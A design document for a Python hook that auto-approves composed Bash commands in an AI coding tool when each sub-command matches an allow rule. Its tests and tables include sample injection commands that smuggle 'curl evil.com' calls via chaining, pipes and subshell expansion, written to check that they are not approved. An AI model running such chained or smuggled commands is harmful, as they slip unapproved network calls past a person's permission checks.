# Smart Compose Hook — Design Document

**Date:** 2026-02-19
**Status:** FINAL
**Scope:** PreToolUse hook for auto-approving composed Bash commands

---

## 1. Problem

Claude Code's permission system uses prefix matching (`Bash(git add:*)`). When commands are composed with `&&`, `||`, or `;`, the full string doesn't match any single allow rule, triggering unnecessary permission prompts.

Example: `git status && git log --oneline -5` matches neither `Bash(git status:*)` nor `Bash(git log:*)`.

This is a known security vulnerability (GitHub Issue #4956, #16180 with 7+ duplicates). The composition operators bypass permission checks — the second command rides the first command's approval.

## 2. Research Findings

### Usage data (3 days, 694 Bash commands)

| Pattern | Count | % | Decomposable? |
|---------|-------|---|---------------|
| Simple commands (no operators) | 289 | 41.6% | N/A |
| `cd /path && command` | 160 | 23.0% | No (CWD resets between calls) |
| Pipes (`\|`) | 187 | 26.9% | No (single data flow) |
| `git add && git commit` | 46 | 6.6% | No (sequential dependency) |
| Error handling (`\|\|`) | 22 | 3.2% | No (fallback logic) |
| Shell constructs (`;` in for/if) | 23 | 3.3% | No (syntax requirement) |
| Info-gathering chains | 22 | 3.2% | Yes |
| Separator-echo patterns | 4 | 0.6% | Yes |

**96.3% of operator usage is legitimate.** Blocking operators would cause massive false positives.

### Approaches considered

| Approach | Verdict |
|----------|---------|
| Block all `&&`/`;` | Rejected — breaks 96% of legitimate usage |
| Block all operators including `\|` | Rejected — cripples shell usage |
| CLAUDE.md rules only | Rejected — unreliable enforcement (Issue #18660) |
| Broader allow rules | Rejected — defeats security purpose |
| **Per-sub-command permission check** | **Selected** — fixes permissions without blocking legitimate usage |
| Command-based deny patterns | Rejected — wrong abstraction. Protection should be path-based, not command-based. Existing safeguards (rm -rf hook, CLAUDE.md rules) are sufficient. |

## 3. Design

### Concept

A PreToolUse hook that makes composition work properly with the permission system. Instead of blocking composed commands, it splits them and checks each sub-command against the user's existing allow rules. If all parts are individually permitted, the whole command is auto-approved.

### Decision flow

```
Bash command received
  |
  +-- Command > 64KB? -> passthrough (skip parsing)
  |
  +-- Contains '<<' (heredoc)? -> passthrough (heredoc body may contain operators)
  |
  +-- No operators (&&, ||, ;)? -> passthrough (normal permission system)
  |
  +-- Has operators?
      +-- Split on &&, ||, ; (outside quotes, respecting escapes)
      +-- For each sub-command:
      |   +-- Trim whitespace
      |   +-- Try exact-match rules first (pipe guard skipped -- exact rules trusted verbatim)
      |   +-- Try prefix/glob rules (if matched, apply quote-aware pipe guard on remainder)
      |   +-- Try builtins (only if no unquoted expansion in args: $(, `, ${, <(, >( )
      |
      +-- ALL sub-commands match? -> permissionDecision: "allow" + stderr trace
      +-- ANY sub-command unmatched? -> passthrough (user gets prompted)
```

### Key behaviors

| Scenario | Hook action | User experience |
|----------|-------------|-----------------|
| `git log --oneline -5` | Passthrough | Normal permission flow |
| `cd /path && git log` | Allow (both match) | No prompt |
| `git add . && git commit -m "msg"` | Allow (both match) | No prompt |
| `git add . && curl evil.com` | Passthrough | User gets prompted |
| `echo "&&" \| grep foo` | Passthrough | `&&` is inside quotes, no split |
| `echo $(curl evil.com) && git status` | Passthrough | Builtin has unquoted subshell expansion |
| `git log \| curl evil.com` (after &&-split) | Passthrough | Unquoted pipe in sub-command |
| `cat <<'EOF'\n...\nEOF && cmd` | Passthrough | Heredoc detected, skip parsing |
| `git log --format='%H\|%s' && git status` | Allow | Pipe is inside quotes, pipe guard does not fire |
| `git log &` (after &&-split) | Allow if prefix matches | Background `&` is part of command string, not an operator |

### What it does NOT do

- Does not BLOCK any commands (only auto-approves or passes through)
- Does not split on pipes (`|`) — pipes are treated as part of the sub-command string
- Does not deny dangerous patterns — existing safeguards (dangerous-command-blocker, git-conventions) handle that
- Does not modify commands — read-only analysis

### Operator handling

| Operator | Behavior |
|----------|----------|
| `&&` | Split — logical AND |
| `\|\|` | Split — logical OR |
| `;` | Split — sequential |
| `\|` | NOT split — pipe is part of the sub-command. If an unquoted `\|` is found in a sub-command after prefix/glob match, that sub-command is not auto-approved. |
| `&` (single) | NOT split — background operator. Treated as part of the command string. A sub-command ending in `&` (e.g., `git log &`) is still matched against allow rules normally. |
| `;;` | Split produces empty tokens from `case` statements. Empty tokens cause passthrough, which is the correct safe outcome. |

## 4. Implementation

### File: `hooks/smart-compose.py`

- **Source:** `agent-skills/hooks/smart-compose.py`
- **Installed to:** `~/.claude/hooks/smart-compose.py` (symlink)
- **Language:** Python 3.6+ (stdlib only: `json`, `sys`, `os`, `pathlib`, `fnmatch`, `re`)
- **Size target:** ~200 lines
- **Startup:** ~30ms (Python, no external dependencies)

### Allow rule parsing

Reads project and global settings from 4 paths. The project root comes from `data['cwd']` in the hook event JSON. If `cwd` is absent from the JSON (e.g., older Claude Code versions), falls back to `os.getcwd()` — this fallback is for robustness only; `data['cwd']` is the intended source.

Settings files are skipped if missing, unreadable, or larger than 1MB (with a debug-mode warning).

1. `{cwd}/.claude/settings.local.json`
2. `{cwd}/.claude/settings.json`
3. `~/.claude/settings.local.json`
4. `~/.claude/settings.json`

Extracts Bash rules from `permissions.allow` arrays:

| Rule format | Match type | Example |
|-------------|-----------|---------|
| `Bash(git log:*)` | Prefix (word-boundary) | Matches `git log --oneline` but NOT `git logger` |
| `Bash(git *)` | Glob (`fnmatch`) | Matches `git status`, `git log -5` |
| `Bash(git commit -m "fix")` | Exact | Matches only `git commit -m "fix"` |

**Word-boundary check:** After a prefix `startswith` match, verify the character immediately after the prefix is a space, tab, or end-of-string. `git log` does NOT match `git logger`.

**Glob matching:** Rules containing glob characters (`*`, `?`, `[`) without the `:*` suffix are matched using Python's `fnmatch`. This supports standard glob syntax: `*` (any chars), `?` (single char), `[seq]` (character class), `[!seq]` (negated class). `Bash(git *)` matches any command starting with `git `.

**Unquoted pipe guard:** After a prefix or glob match, the sub-command remainder is scanned for unquoted `|` using the same quote-awareness as the main splitter. `git log | curl evil.com` does NOT match `Bash(git log:*)`. But `git log --format='%H|%s'` DOES match because the `|` is inside single quotes. Exact-match rules are trusted verbatim and bypass the pipe guard — if you write an exact rule, you own the full command string.

### Quote-aware splitting

A state machine that tracks:
- Inside single quotes (`'...'`) — no splitting, no escape handling
- Inside double quotes (`"..."`) — no splitting, `\"` and `\\` skip next char
- Inside ANSI-C quotes (`$'...'`) — no splitting, `\` followed by any char is treated as an escape (the pair is consumed without toggling quote state). This covers `\'`, `\\`, `\n`, `\t`, `\xNN`, `\uXXXX`, and all other ANSI-C escape sequences.
- Backslash outside quotes (`\`) — skip next char (handles line continuation and escaped operators)
- Otherwise — split on `&&`, `||`, `;`

**ANSI-C detection:** When parser sees `$` followed by `'` (and not already inside any quote mode), it enters ANSI-C quote mode. The `$` is consumed as a regular character, then `'` opens the ANSI-C context.

### Auto-allowed builtins

These commands are permitted as sub-commands **only if their arguments contain no unquoted subshell/process expansion** (`$(`, `` ` ``, `${`, `<(`, `>(`):

- `cd` — changes directory (most common `&&` pattern)
- `echo` — prints text (used as separator in info-gathering chains)
- `printf` — output formatting (similar use case to echo)
- `true` / `false` — no-ops
- `test` / `[` / `[[` — condition checks

**Expansion guard:** Before granting builtin trust, the sub-command string is scanned for `$(`, `` ` ``, `${`, `<(`, or `>(` **outside quotes** using the same quote-awareness as the main splitter. `echo "result: $(date)"` is allowed (the `$(` is inside double quotes). `echo $(curl evil.com)` is rejected (unquoted `$(`). `echo <(curl evil.com)` is rejected (unquoted process substitution). If the expansion guard rejects a builtin, the sub-command falls through to allow-rule matching.

### Hook registration — ORDERING INVARIANT

**smart-compose MUST be registered LAST** in the PreToolUse hook array. When a hook returns `permissionDecision: "allow"`, Claude Code is assumed to skip subsequent hooks (defensive assumption — exact behavior may vary by version, but registering last is safe regardless). By registering smart-compose last, all deny-capable hooks (dangerous-command-blocker, git-conventions) run first. smart-compose only fires as a final "all clear" after other hooks have had their chance to block or deny.

In `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "python3 ~/.claude/hooks/dangerous-command-blocker.py"
          }
        ]
      },
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "python3 ~/.claude/hooks/git-conventions.py"
          }
        ]
      },
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "python3 ~/.claude/hooks/smart-compose.py"
          }
        ]
      }
    ]
  }
}
```

### Deployment

Symlink from agent-skills source to global Claude config:

```bash
ln -sf /path/to/agent-skills/hooks/smart-compose.py ~/.claude/hooks/smart-compose.py
```

### Observability

**Standard logging (always on):**
- On auto-approve: `[smart-compose] auto-approved N sub-commands` to stderr
- On error: `[smart-compose] error (passthrough): {message}` to stderr

**Debug mode (`SMART_COMPOSE_DEBUG=1`):**
- Dumps all loaded rules (count by type: prefix, glob, exact)
- Per-sub-command: `[smart-compose:debug] sub-cmd: "{cmd}" -> {matched_rule_type}:{matched_value}` or `no match`
- Zero rules loaded: `[smart-compose:debug] warning: no allow rules found in any settings file`
- Settings file skipped (missing/too large): `[smart-compose:debug] skipped {path}: {reason}`
- All output to stderr

**Activating debug mode:** Set the environment variable before invoking Claude Code: `SMART_COMPOSE_DEBUG=1 claude`. Alternatively, prepend the env var in the settings.json command: `"command": "SMART_COMPOSE_DEBUG=1 python3 ~/.claude/hooks/smart-compose.py"` (temporary, for troubleshooting only).

## 5. CLAUDE.md Addition

Add to the agent-skills `CLAUDE.md` under the **Hook Protocol** section:

```markdown
### Smart Compose Hook

The `smart-compose` hook (`hooks/smart-compose.py`) auto-approves composed Bash commands where every sub-command individually matches an existing allow rule. It splits on `&&`, `||`, `;` outside quotes, checks each part against prefix/glob/exact rules and builtins, and passes through to the normal permission system if any part is unrecognized.

- Installed to: `~/.claude/hooks/smart-compose.py` (symlink)
- Registered in: `~/.claude/settings.json` under `hooks.PreToolUse`
- **Must be last in the array** — if other deny-capable hooks exist (e.g., `dangerous-command-blocker`, `git-conventions`), they must appear earlier so they can block before smart-compose approves
- Reads allow rules from: project `.claude/settings.local.json` and `.claude/settings.json` + global `~/.claude/settings.local.json` and `~/.claude/settings.json`

### Command Composition

- Prefer separate parallel Bash calls for independent commands
- Use `&&` only for genuinely dependent operations (cd+command, git add+commit)
- Use Glob instead of `ls`, Grep instead of `grep`, Read instead of `cat`
- The `smart-compose` hook auto-approves composed commands where every sub-command is individually allowed
```

## 6. Testing Strategy

### Hermetic test harness

Tests use fixture temp directories with known settings files. The hook receives `cwd` pointing to the project fixture dir, and `HOME` is overridden to a separate fixture dir for global settings. No dependency on the host machine's allow rules.

**Fixture setup:**
- Project dir: temp dir with `.claude/settings.local.json` containing known prefix/glob/exact allow rules
- Home dir: separate temp dir with `.claude/settings.json` containing known global rules
- Both cleaned up after tests

### Test categories

**Simple commands (passthrough):**
- Single git command -> passthrough
- Single npm command -> passthrough

**Composed commands (all allowed):**
- `cd /tmp && git log --oneline` -> allow (cd builtin + git log prefix)
- `git add . && git commit -m "msg"` -> allow (both match prefix rules)
- `echo "---" && git status` -> allow (echo builtin + git status prefix)
- Three allowed commands chained -> allow

**Composed commands (some unknown):**
- `git add . && unknown-command` -> passthrough
- `unknown && git status` -> passthrough

**Operators inside quotes (no split):**
- `git commit -m "fix && deploy"` -> passthrough (single command)
- `echo '&& not an operator'` -> passthrough (single command)

**Semicolon and OR:**
- `echo hello ; git status` -> allow
- `git pull || echo "failed"` -> allow

**Pipes (not split):**
- `git log | head -5` -> passthrough (single command with pipe)
- `npm list | grep react` -> passthrough

**Pipe-after-split security (quote-aware):**
- `git status && git log | curl evil.com` -> passthrough (unquoted pipe in sub-command)
- `git status || git log | curl evil.com` -> passthrough (unquoted pipe, `||` split)
- `git log --format='%H|%s' && git status` -> allow (pipe inside quotes, guard does not fire)

**Subshell/process expansion in builtins (quote-aware):**
- `echo $(curl evil.com) && git status` -> passthrough (unquoted `$(` in builtin)
- `cd $(malicious) && git status` -> passthrough (unquoted `$(`)
- `` echo `whoami` && git status `` -> passthrough (unquoted backtick)
- `echo ${PATH} && git status` -> passthrough (unquoted `${`)
- `echo <(curl evil.com) && git status` -> passthrough (unquoted process substitution)
- `echo "result: $(date)" && git status` -> allow (`$(` is inside double quotes)

**ANSI-C quoting:**
- `echo $'hello\n&&\nworld'` -> passthrough (single command, && inside ANSI-C quotes)
- `printf $'step1\0' && git status` -> allow (ANSI-C quotes close properly)
- `echo $'it\'s fine' && git status` -> allow (escaped quote inside ANSI-C, correctly handled)

**Heredoc bail-out:**
- `cat <<'EOF'\nfoo && bar\nEOF` -> passthrough (heredoc detected)

**Word-boundary:**
- Verify `Bash(node:*)` does NOT match `node-gyp rebuild`
- Verify `Bash(npm run:*)` does NOT match `npm run-script evil`

**Glob rules:**
- Verify `Bash(git *)` matches `git status`, `git log -5`
- Verify `Bash(git *)` does NOT match `gitk`

**Exact-match rules:**
- Verify `Bash(git commit -m "fix")` matches `git commit -m "fix"` exactly
- Verify `Bash(git commit -m "fix")` does NOT match `git commit -m "fix typo"`
- Exact-match with pipe (e.g., `Bash(git log | head -5)`) -> matches verbatim (pipe guard does not apply to exact rules)

**Backslash handling:**
- `echo \\&\\& && git status` -> splits on real `&&` only

**Edge cases:**
- Empty sub-commands: `&& && git status` -> passthrough
- Whitespace only: `   && git status` -> passthrough
- Builtin `true`: `true && git status` -> allow
- Builtin `test`: `test -f file && echo yes` -> allow
- Builtin `[[`: `[[ -f file ]] && echo yes` -> allow
- Builtin `printf`: `printf "%s\n" hello && git status` -> allow
- Command > 64KB -> passthrough (length guard)
- Settings file > 1MB -> skipped with debug warning

**Global vs. local settings:**
- Rule in global settings only -> matches
- Rule in project settings only -> matches
- Rule in both -> matches (no conflict)

### Manual integration testing

After deployment, restart Claude Code session (hooks snapshot at startup):
1. Composed allowed commands -> no prompt
2. Composed with unknown -> prompt appears
3. Quotes with `&&` -> no false split
4. Simple command -> normal flow

## 7. Risks and Mitigations

| Risk | Likelihood | Mitigation |
|------|-----------|------------|
| Quote parsing misses edge case | Low | Fail open (passthrough), ANSI-C mode handles common patterns |
| settings file read fails | Very low | Catch error, passthrough, stderr diagnostic |
| Performance regression | Low | ~30ms per call, 64KB command guard, 1MB settings file guard |
| Hook crashes | Low | Exit 0 on error = passthrough, stderr diagnostic |
| Heredoc with operators | Very low | Pre-check for `<<` forces passthrough before splitting |
| Hook chain ordering violated | Low | Documented invariant: smart-compose registered last. Enforced in install instructions and CLAUDE.md. |
| Subshell/process expansion in builtins | Low | Quote-aware expansion guard rejects unquoted `$(`, backticks, `${`, `<(`, `>(` in builtin args |
| Prefix over-matching | Low | Word-boundary check after startswith |
| fnmatch bracket expressions | Very low | Documented as supported; users writing `[seq]` patterns get standard glob behavior |

## 8. Future Considerations

- **Path-based protection**: A separate hook could deny commands targeting system files (`/etc`, `/usr`, `~/.ssh`). This is a different problem from composition.
- **Permission cleanup**: The 100+ accumulated allow rules in settings.local.json could be audited and consolidated.
- **Subagent coverage**: PreToolUse hooks have a known bug (#26923) where exit code 2 doesn't block Task tool calls. The smart-compose hook uses `permissionDecision: "allow"` (not blocking), so this bug doesn't affect it.
- **Shared parsing utility**: Extract quote-aware splitting into `hooks/_utils.py` shared by smart-compose and git-conventions when a third consumer appears.

## 9. Key Decisions Made

| Decision | Rationale |
|----------|-----------|
| Python, not Node.js | All existing hooks are Python. Keeps conventions consistent, eliminates Node.js dependency. |
| Register last in hook chain | `permissionDecision: "allow"` is assumed to short-circuit subsequent hooks (defensive). Last position ensures deny-capable hooks run first. |
| Use `data['cwd']` from hook event | `os.getcwd()` may differ from the project directory. Hook event provides authoritative `cwd`. Fallback to `os.getcwd()` for robustness only. |
| `fnmatch` for glob rules | Real settings contain `Bash(git *)` format. `fnmatch` handles `*`, `?`, and `[seq]` patterns from stdlib. Full glob syntax documented. |
| Quote-aware expansion guard | Prevents `echo $(evil)` and `echo <(evil)` from being auto-approved while allowing `echo "$(date)"`. Covers `$(`, `` ` ``, `${`, `<(`, `>(`. Same quote state machine re-used. |
| Quote-aware pipe guard | Prevents `git log \| curl evil` after split while allowing `git log --format='%H\|%s'`. Exact-match rules bypass pipe guard (trusted verbatim). |
| Pre-check for heredocs | `<<` in command forces passthrough — avoids spurious splits of heredoc body. |
| Word-boundary on prefix match | `Bash(node:*)` must not match `node-gyp`. Check char after prefix is space/tab/end. |
| 1MB settings file guard | Prevents pathological settings files from degrading hook performance. Skipped with debug warning. |
| Zero-rules warning is debug-only | Avoids flooding stderr in projects with no Bash allow rules. Visible via `SMART_COMPOSE_DEBUG=1`. |

## 10. Out of Scope

(none — all raised issues were addressed)

## 11. Deferred

(none — all raised issues were addressed in the design)

## 12. Hardening Summary

Design went through 4 rounds of systematic hardening across 11 categories (10 core + Security).

| Round | Must-fix | Should-fix | Nice-to-have | Status |
|-------|----------|------------|--------------|--------|
| 1 | 5 | 11 | 7 (6 promoted) | All resolved |
| 2 | 3 | 9 | 2 | All resolved |
| 3 | 0 | 2 | 0 | All resolved |
| 4 (final) | 0 | 0 | 0 | Converged |

Key hardening outcomes: Python rewrite, hook chain ordering invariant, quote-aware pipe and expansion guards, hermetic test fixtures, fnmatch glob support, ANSI-C quote mode, process substitution guard, 64KB/1MB size guards, debug mode.
